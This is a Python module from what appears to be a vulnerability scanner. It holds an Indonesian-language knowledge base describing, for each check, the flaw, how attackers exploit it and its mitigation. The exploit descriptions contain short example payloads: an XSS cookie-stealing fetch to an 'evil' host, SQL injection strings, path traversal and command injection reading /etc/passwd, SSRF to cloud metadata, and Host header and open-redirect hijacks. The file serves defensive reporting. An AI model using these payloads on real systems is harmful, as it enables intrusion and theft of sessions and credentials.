"""Knowledge-base skenario serangan per-modul (Bahasa Indonesia).

Setiap entry berisi:
  - what:    Penjelasan singkat *apa* celahnya.
  - exploit: Bagaimana penyerang biasanya membobolnya (langkah-langkah).
  - mitigate: Cara menanggulangi (lebih spesifik dari field `remediation`).
  - access_label: Label "akses yang dapat ditembus" jika finding ini menandakan
                  penyerang sudah mendapatkan suatu akses.
  - access_check: callable(finding) -> bool, menentukan apakah finding ini
                  benar-benar mengindikasikan akses berhasil.
"""
from __future__ import annotations

from cyberloka.core import Finding, Severity


def _sev_high_or_critical(f: Finding) -> bool:
    return f.severity in (Severity.CRITICAL, Severity.HIGH)


SCENARIOS: dict[str, dict] = {
    # ============================== RECON =================================
    "dns": {
        "what": "Konfigurasi DNS publik target dapat dipetakan (A/MX/TXT/NS/CNAME).",
        "exploit": (
            "Penyerang melakukan zone-walking & subdomain enumeration untuk "
            "memetakan permukaan serangan. Record TXT seringkali bocorkan "
            "nama service internal, vendor email, atau verifikasi cloud."
        ),
        "mitigate": (
            "Audit record DNS publik secara berkala. Hapus record yang tidak "
            "dipakai. Aktifkan DNSSEC. Pisahkan zone internal-external."
        ),
    },
    "whois": {
        "what": "Informasi WHOIS publik mengungkap pemilik domain & kontak.",
        "exploit": (
            "Penyerang memakai informasi kontak untuk spear-phishing administrator, "
            "atau membaca sejarah pendaftaran untuk menemukan domain related."
        ),
        "mitigate": (
            "Aktifkan WHOIS privacy/proxy dari registrar. Gunakan email role "
            "(admin@domain) bukan email personal."
        ),
    },
    "ports": {
        "what": "Port TCP terbuka di luar HTTP/HTTPS publik.",
        "exploit": (
            "Penyerang mencoba service version detection lalu mencari CVE pada "
            "service tersebut (mis. Redis 6379, MongoDB 27017, RDP 3389, "
            "Elasticsearch 9200) untuk RCE atau data exfiltration."
        ),
        "mitigate": (
            "Tutup semua port yang tidak perlu di edge firewall. Layanan database/cache "
            "WAJIB tidak terbuka ke internet. Aktifkan auth & TLS untuk service yang "
            "memang harus terekspos."
        ),
        "access_label": "Service non-HTTP terbuka",
        "access_check": _sev_high_or_critical,
    },
    "subdomains": {
        "what": "Subdomain tambahan yang masih aktif.",
        "exploit": "Penyerang memilih subdomain dengan postur keamanan terlemah.",
        "mitigate": "Inventarisasi subdomain & enforce baseline security yang sama.",
    },
    "fingerprint": {
        "what": "Server / framework / CMS dapat diidentifikasi.",
        "exploit": (
            "Penyerang mencocokkan versi dengan database CVE. Versi usang dari "
            "Apache/Nginx/IIS, WordPress, Drupal, Joomla, Spring, Struts2 sering "
            "punya 1-day exploit publik."
        ),
        "mitigate": (
            "Hapus banner versi (`ServerTokens Prod` di Apache, `server_tokens off` "
            "di Nginx). Patching rutin. Tambahkan header generik di CDN."
        ),
    },
    "waf_detect": {
        "what": "Identifikasi WAF / CDN di depan aplikasi.",
        "exploit": (
            "Penyerang menyesuaikan payload untuk mem-bypass WAF (mis. encoding, "
            "fragmentation, IP rotation). WAF saja bukan pengganti perbaikan kode."
        ),
        "mitigate": (
            "Pastikan rule WAF up-to-date. Lapisan defense in depth: WAF + secure "
            "code + monitoring. Enable bot management & rate-limiting di WAF."
        ),
    },
    "subdomain_takeover": {
        "what": "Record CNAME mengarah ke resource pihak ketiga yang sudah tidak ada.",
        "exploit": (
            "Penyerang mengklaim resource (mis. membuat bucket S3 dengan nama "
            "yang sama, app Heroku, GitHub Pages site) lalu menjalankan konten "
            "ARBITRER di bawah subdomain Anda. Karena domainnya sah, attacker "
            "bisa memasang phishing, malware, hingga cookie hijack via main domain "
            "jika cookie ber-scope `.example.com`."
        ),
        "mitigate": (
            "Hapus CNAME dangling di DNS. Bangun proses inventarisasi DNS rutin "
            "(IaC + CI check). Untuk cloud: hapus DNS sebelum menghapus resource, "
            "bukan sebaliknya."
        ),
        "access_label": "Subdomain takeover (full content control)",
        "access_check": lambda f: True,
    },

    # ============================= PASSIVE ================================
    "headers": {
        "what": "Security header HTTP tidak lengkap atau lemah.",
        "exploit": (
            "Tanpa CSP, attacker yang berhasil inject XSS dapat ekfiltrasi data via "
            "request lintas-origin. Tanpa HSTS, MITM bisa downgrade ke HTTP. "
            "Tanpa X-Frame-Options/CSP frame-ancestors, attacker melakukan clickjacking."
        ),
        "mitigate": (
            "Set `Strict-Transport-Security` (>=180 hari + preload), `Content-Security-Policy` "
            "ketat (default-src 'self'), `X-Content-Type-Options: nosniff`, "
            "`X-Frame-Options: DENY` atau `frame-ancestors 'none'`, "
            "`Referrer-Policy: strict-origin-when-cross-origin`, `Permissions-Policy`."
        ),
    },
    "tls": {
        "what": "Konfigurasi TLS/SSL lemah (versi lama, cipher buruk, sertifikat).",
        "exploit": (
            "TLS 1.0/1.1 dapat di-downgrade. Cipher RC4/3DES/EXPORT bisa dipecah. "
            "Sertifikat expired/wildcard yang bocor membuat MITM mudah. "
            "Penyerang on-path memakai SSLstrip atau forced-redirect untuk mencuri "
            "session/credential."
        ),
        "mitigate": (
            "Hanya aktifkan TLS 1.2 & 1.3. Disable cipher lemah. Renew sertifikat sebelum "
            "expired. Aktifkan HSTS preload. Untuk e-banking/finansial: gunakan "
            "OCSP must-staple."
        ),
        "access_label": "Saluran TLS lemah (MITM dimungkinkan)",
        "access_check": _sev_high_or_critical,
    },
    "cookies": {
        "what": "Cookie tidak memakai flag Secure/HttpOnly/SameSite.",
        "exploit": (
            "Cookie tanpa HttpOnly bisa dibaca via XSS -> session hijack. Tanpa "
            "Secure bisa bocor di koneksi HTTP. Tanpa SameSite memungkinkan CSRF."
        ),
        "mitigate": (
            "Set `Secure; HttpOnly; SameSite=Lax` (atau Strict) untuk cookie session. "
            "Jangan letakkan token sensitif di cookie tanpa flag tersebut."
        ),
    },
    "cors": {
        "what": "CORS misconfiguration (wildcard atau reflect Origin + credentials).",
        "exploit": (
            "Penyerang membuat halaman jahat. Browser korban (yang login di target) "
            "diminta melakukan request ke API target. Karena CORS terlalu permisif, "
            "browser mengizinkan attacker membaca response (termasuk data sensitif & token)."
        ),
        "mitigate": (
            "Whitelist origin secara explicit (jangan pakai `*` dengan credentials). "
            "Validasi Origin server-side. Pisahkan API publik & API yang membawa session."
        ),
        "access_label": "Pembacaan API lintas-origin (data exfil)",
        "access_check": _sev_high_or_critical,
    },
    "clickjacking": {
        "what": "Halaman dapat di-frame dari domain lain.",
        "exploit": (
            "Attacker meng-overlay UI palsu di atas iframe target. Korban yang "
            "login dapat melakukan aksi (transfer, change-password, klik Approve) "
            "tanpa sadar."
        ),
        "mitigate": (
            "Set `Content-Security-Policy: frame-ancestors 'none'` atau "
            "`X-Frame-Options: DENY`."
        ),
    },
    "methods": {
        "what": "HTTP method berbahaya (TRACE/PUT/DELETE) terbuka.",
        "exploit": (
            "PUT/DELETE pada endpoint yang salah konfig WebDAV dapat dipakai upload "
            "webshell. TRACE memungkinkan Cross-Site Tracing. OPTIONS membantu attacker "
            "memetakan API."
        ),
        "mitigate": (
            "Disable method yang tidak dipakai di reverse proxy/aplikasi. Untuk "
            "WebDAV: hilangkan, atau enforce auth + path whitelist."
        ),
    },
    "sensitive_files": {
        "what": "File/folder sensitif (.git, .env, backup, phpinfo, dll.) ter-ekspos.",
        "exploit": (
            "Dengan `.git/` ter-ekspos, attacker memakai tool seperti `gitdumper`/"
            "`git-dumper.py` untuk merekonstruksi seluruh repo termasuk history -> "
            "akses kredensial DB, API key, source code lengkap, deployment script. "
            "Dengan `.env` ter-ekspos, attacker langsung dapat secret. "
            "`backup.zip`/`db.sql` membocorkan dump database -> kredensial user."
        ),
        "mitigate": (
            "Tolak akses ke prefiks `/.git/`, `/.env`, `/.svn/`, `/.DS_Store`, "
            "`/backup`, `*.bak`, `*.sql`, `/phpinfo.php` di reverse proxy. "
            "Build pipeline harus exclude file dotfiles ke artifact production. "
            "Rotate semua secret yang sudah pernah ter-publish."
        ),
        "access_label": "Source code / kredensial via file ter-ekspos",
        "access_check": lambda f: True,
    },
    "robots": {
        "what": "robots.txt / sitemap.xml mengungkap path sensitif.",
        "exploit": (
            "Attacker membaca robots.txt -> daftar path /admin, /staging, /api/internal "
            "yang justru dimaksudkan untuk disembunyikan."
        ),
        "mitigate": "Jangan jadikan robots.txt sebagai security control. Auth-kan path sensitif.",
    },
    "api_discovery": {
        "what": "Dokumentasi/management console API ter-ekspos publik (Swagger, Actuator, Tomcat manager, H2 console, dll.).",
        "exploit": (
            "Penyerang membaca Swagger -> mendapat seluruh struktur API termasuk "
            "endpoint admin. Spring Boot Actuator `/env` membocorkan environment "
            "variable (DB password, API key). `/heapdump` memberikan snapshot memory "
            "yang bisa diparse untuk session token. H2 console punya bug RCE klasik. "
            "Tomcat manager -> deploy WAR malicious -> RCE."
        ),
        "mitigate": (
            "Pindahkan dokumentasi ke environment internal (VPN-only). Untuk Spring: "
            "`management.endpoints.web.exposure.include=health` saja. Hapus H2/Tomcat "
            "manager di production. Tambahkan auth + IP allow-list."
        ),
        "access_label": "Management console / dokumentasi API",
        "access_check": _sev_high_or_critical,
    },
    "graphql": {
        "what": "Endpoint GraphQL ditemukan; kadang dengan introspection terbuka.",
        "exploit": (
            "Dengan introspection, attacker mengunduh schema lengkap (types, fields, "
            "mutations, args). Attacker memetakan field privileged dan mencoba "
            "broken-object-level-authorization (BOLA). Tanpa depth/complexity limit, "
            "attacker dapat membuat query nested untuk DoS."
        ),
        "mitigate": (
            "Disable introspection di production. Persisted queries (whitelist). "
            "Depth/complexity limit. Auth + per-resolver authorization."
        ),
        "access_label": "Schema GraphQL (peta API internal)",
        "access_check": lambda f: "introspection" in f.title.lower(),
    },
    "csrf": {
        "what": "Form POST tanpa anti-CSRF token.",
        "exploit": (
            "Attacker membuat halaman jahat dengan form auto-submit. Korban yang "
            "login di target diarahkan -> browser-nya mengirim request POST membawa "
            "cookie session -> aksi (transfer, ubah email, ubah password) ter-eksekusi."
        ),
        "mitigate": (
            "Synchronizer token pattern (per-form CSRF token) atau double-submit "
            "cookie + SameSite=Lax. Banyak framework menyediakan ini built-in."
        ),
        "access_label": "Aksi sensitif via CSRF",
        "access_check": lambda f: True,
    },
    "jwt": {
        "what": "Audit token JWT (alg=none, expired, weak HMAC).",
        "exploit": (
            "Dengan `alg=none`, attacker memodifikasi payload (mis. `role: admin`) "
            "tanpa signature -> server menerima -> attacker login sebagai siapapun. "
            "Dengan HMAC secret lemah, attacker brute-force secret offline lalu "
            "mengeluarkan token palsu."
        ),
        "mitigate": (
            "Tolak `alg=none`. Hardcode algoritma (RS256/ES256). Secret HMAC >=256-bit "
            "acak. Validasi `exp`, `iss`, `aud`. Simpan token di HttpOnly cookie."
        ),
        "access_label": "Forgery token JWT (impersonation)",
        "access_check": lambda f: "alg=none" in f.title.lower() or f.severity == Severity.CRITICAL,
    },
    "secrets": {
        "what": "Secret/API key bocor di body HTML atau file JS.",
        "exploit": (
            "Attacker membaca AWS access key -> akses bucket/EC2 organisasi. "
            "Stripe live key -> charge fraud. GitHub PAT -> baca repo private. "
            "JDBC URL dengan password -> akses database langsung. "
            "Mongo URI -> dump koleksi."
        ),
        "mitigate": (
            "JANGAN pernah taruh secret di kode frontend. Gunakan secret manager "
            "(AWS Secrets Manager, Vault, GCP Secret Manager). Setelah finding ini: "
            "REVOKE & ROTATE secret tersebut, audit penggunaan key di log cloud."
        ),
        "access_label": "Akses cloud/3rd-party via secret bocor",
        "access_check": _sev_high_or_critical,
    },
    "mixed_content": {
        "what": "Halaman HTTPS me-load resource HTTP.",
        "exploit": (
            "Attacker on-path memodifikasi resource HTTP -> menyisipkan JS jahat -> "
            "menjalankan kode di context HTTPS user (CSRF, keylogger, redirect)."
        ),
        "mitigate": (
            "Ubah semua URL ke HTTPS atau protocol-relative. Aktifkan "
            "`Content-Security-Policy: upgrade-insecure-requests`."
        ),
    },
    "info_disclosure": {
        "what": "HTML comment sensitif, stack trace, atau debug page ter-expose.",
        "exploit": (
            "Stack trace mengungkap path file, versi library, query SQL. Halaman "
            "Werkzeug/Whitelabel debug bahkan memungkinkan eksekusi kode (Werkzeug "
            "console = RCE). Comment HTML dengan kredensial / TODO membantu reconnaissance."
        ),
        "mitigate": (
            "Disable debug/development mode di production. Halaman error generik. "
            "Strip comment HTML di build. Catat detail error ke log internal saja."
        ),
        "access_label": "Debug console / stack trace",
        "access_check": _sev_high_or_critical,
    },
    "cache": {
        "what": "Halaman terotentikasi mengizinkan caching bersama.",
        "exploit": (
            "Pada CDN/proxy bersama, response satu user (yang membawa data privat) "
            "dapat dikirimkan kembali ke user lain -> kebocoran data."
        ),
        "mitigate": (
            "Halaman terotentikasi: `Cache-Control: no-store`. Pastikan CDN tidak "
            "mem-bypass header tersebut."
        ),
    },

    # ============================== ACTIVE ================================
    "sqli": {
        "what": "SQL Injection: input user mengubah struktur query.",
        "exploit": (
            "Attacker memasukkan `' OR 1=1 --` -> bypass auth. Dengan UNION SELECT "
            "-> dump tabel users (hash password, email). Dengan time-based blind "
            "attacker mengekstrak data karakter-per-karakter. Pada beberapa DB, "
            "SQLi dapat berlanjut ke RCE (`xp_cmdshell` di MSSQL, `LOAD_FILE`/`INTO "
            "OUTFILE` di MySQL)."
        ),
        "mitigate": (
            "Parameterized query (prepared statement) WAJIB. ORM dengan binding. "
            "Validasi & whitelisting input. Least-privilege DB user. WAF sebagai "
            "defense in depth."
        ),
        "access_label": "Akses database (SQL Injection)",
        "access_check": lambda f: True,
    },
    "xss": {
        "what": "Cross-Site Scripting (input dipantulkan tanpa encoding).",
        "exploit": (
            "Attacker membuat link `?q=<script>fetch('//evil/?c='+document.cookie)`. "
            "Korban klik -> cookie session dicuri (kalau tidak HttpOnly). XSS yang "
            "tersimpan di komentar/profile dapat menyerang setiap pengunjung. Dengan "
            "BeEF, attacker bahkan dapat keylog & pivot."
        ),
        "mitigate": (
            "Output encoding sesuai context (HTML/JS/CSS/URL). Template engine yang "
            "auto-escape. CSP ketat (no inline script). HttpOnly cookie. "
            "`X-Content-Type-Options: nosniff`."
        ),
        "access_label": "Eksekusi JS di browser korban (session theft)",
        "access_check": lambda f: True,
    },
    "redirect": {
        "what": "Open Redirect (parameter URL terkontrol attacker).",
        "exploit": (
            "Attacker membuat link `target.com/login?next=//evil.com`. Korban melihat "
            "domain target sah -> setelah login diarahkan ke phising replica. Sering "
            "dipakai untuk OAuth-token theft."
        ),
        "mitigate": (
            "Whitelist domain tujuan. Gunakan token redirect (signed). Tampilkan "
            "interstitial 'Anda akan meninggalkan situs' untuk URL eksternal."
        ),
        "access_label": "Phishing via domain target",
        "access_check": lambda f: True,
    },
    "lfi": {
        "what": "Local File Inclusion / Path Traversal.",
        "exploit": (
            "Parameter `?file=../../../../etc/passwd` -> attacker membaca file system. "
            "Lebih lanjut: baca config aplikasi, kunci SSH, source code. Pada PHP, "
            "kombinasi LFI + log poisoning -> RCE."
        ),
        "mitigate": (
            "Whitelist nama file. Resolve path lalu cek `startswith(base_dir)`. "
            "Hapus karakter path traversal. Process least-privilege."
        ),
        "access_label": "Pembacaan file server",
        "access_check": lambda f: True,
    },
    "cmdi": {
        "what": "Command Injection (input masuk ke shell).",
        "exploit": (
            "Input `; cat /etc/passwd` atau `$(id)` membuat shell mengeksekusi "
            "perintah tambahan. Attacker memperoleh RCE -> reverse shell -> "
            "lateral movement -> exfil data."
        ),
        "mitigate": (
            "JANGAN concat user input ke shell. Gunakan API library native (mis. "
            "`subprocess.run([...], shell=False)`). Whitelist & escape input."
        ),
        "access_label": "Remote Code Execution",
        "access_check": lambda f: True,
    },
    "dirlist": {
        "what": "Directory listing aktif di server.",
        "exploit": (
            "Attacker browsing folder -> menemukan backup, log, file konfig, "
            "binary internal. Sering kombinasi dengan `.git/` atau `node_modules/`."
        ),
        "mitigate": (
            "Disable autoindex (Apache: `Options -Indexes`, Nginx: `autoindex off`). "
            "Letakkan index.html kosong sebagai fallback."
        ),
        "access_label": "Browsing folder server",
        "access_check": lambda f: True,
    },
    "host_header": {
        "what": "Host / X-Forwarded-Host injection.",
        "exploit": (
            "Server membentuk URL absolut (mis. password reset link) memakai Host "
            "header dari client. Attacker mengirim Host: evil.com -> link reset di "
            "email korban mengarah ke evil.com -> attacker menerima token reset -> "
            "ambil-alih akun. Pada CDN: cache poisoning."
        ),
        "mitigate": (
            "Gunakan canonical hostname dari konfigurasi server, bukan Host header. "
            "Whitelist Host di reverse-proxy."
        ),
        "access_label": "Account takeover via password-reset hijack",
        "access_check": _sev_high_or_critical,
    },
    "ssrf": {
        "what": "Server-Side Request Forgery.",
        "exploit": (
            "Parameter URL/callback membuat server mem-fetch URL atas nama attacker. "
            "Target: cloud metadata (`169.254.169.254` -> IAM credential di AWS), "
            "service internal (Redis, internal API), atau scheme `file:///etc/passwd`. "
            "Kombinasi SSRF + cloud metadata = pengambilalihan kredensial cloud."
        ),
        "mitigate": (
            "Whitelist destinasi outbound. Tolak IP private (RFC1918, link-local, "
            "loopback) dan scheme non-HTTP(S). Egress proxy. IMDSv2 di AWS."
        ),
        "access_label": "Akses internal network / cloud metadata",
        "access_check": _sev_high_or_critical,
    },

    # ============================= SIMULATE ===============================
    "rate_limit": {
        "what": "Endpoint login/penting tidak menerapkan rate-limit.",
        "exploit": (
            "Attacker melakukan credential stuffing (pasangan user/pass dari leak "
            "publik) atau brute-force password lemah. Tanpa rate-limit & MFA, satu "
            "akun dapat diambil-alih dalam menit."
        ),
        "mitigate": (
            "Rate-limit per IP & per akun (mis. 5 percobaan / 15 menit). Lockout "
            "sementara. CAPTCHA setelah N kegagalan. Wajib MFA. Monitor anomaly login."
        ),
        "access_label": "Brute-force / credential stuffing terbuka",
        "access_check": _sev_high_or_critical,
    },
    "burst": {
        "what": "Burst test (apakah ada rate-limiter di edge).",
        "exploit": (
            "Tanpa rate-limit, attacker dapat scraping data, enumeration username, "
            "atau melakukan DoS murah."
        ),
        "mitigate": "Aktifkan rate-limit di Nginx/CDN/WAF.",
    },
}


def get_scenario(module: str) -> dict:
    """Return scenario dict for a module, with sane defaults."""
    return SCENARIOS.get(
        module,
        {
            "what": "Finding teknis pada modul ini.",
            "exploit": "Lihat field 'Bukti' dan 'Deskripsi' untuk konteks.",
            "mitigate": "Ikuti rekomendasi pada bagian 'Cara Menanggulangi' di bawah.",
        },
    )


def is_access_gained(finding: Finding) -> tuple[bool, str]:
    """Check whether a finding indicates the attacker can/has gained some access.

    Returns (gained, label).
    """
    sc = SCENARIOS.get(finding.module)
    if not sc:
        return False, ""
    label = sc.get("access_label")
    check = sc.get("access_check")
    if not label or not check:
        return False, ""
    try:
        ok = bool(check(finding))
    except Exception:  # noqa: BLE001
        ok = False
    return ok, label if ok else ""
